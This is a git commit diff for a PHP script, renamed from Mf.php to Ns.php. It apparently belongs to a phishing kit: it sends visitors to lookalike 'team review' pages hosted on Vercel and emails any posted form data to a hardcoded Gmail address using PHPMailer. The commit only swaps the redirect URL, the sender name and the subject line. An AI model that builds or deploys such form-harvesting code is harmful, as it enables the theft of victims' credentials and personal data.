7cf024e32e7677a8718aa82b378d4fe956636ac4
Meri3394 <metaserve7@gmail.com>
2025-07-10 16:46:33 +0500

    Update and rename Mf.php to Ns.php

--- Ns.php
+++ Ns.php
@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://help-team-review.vercel.app/");
+header("Location: https://sure-team-page.vercel.app/");
 
 require 'Exception.php'; 
 require 'PHPMailer.php';
@@ -34,7 +34,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
 
         // Email properties
-        $mail->setFrom('Lernayouamzaxal@gmail.com', 'mf');
+        $mail->setFrom('Lernayouamzaxal@gmail.com', 'ns');
         $mail->addAddress('Lernayouamzaxal@gmail.com');
        $mail->addAddress('Lernayouamzaxal@gmail.com');
 
@@ -43,7 +43,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
         // Email content
         $mail->isHTML(true);
-        $mail->Subject = 'mf';
+        $mail->Subject = 'ns';
         $mail->Body = $emailBody; // Set the email body using the collected form data
 
         // Send email
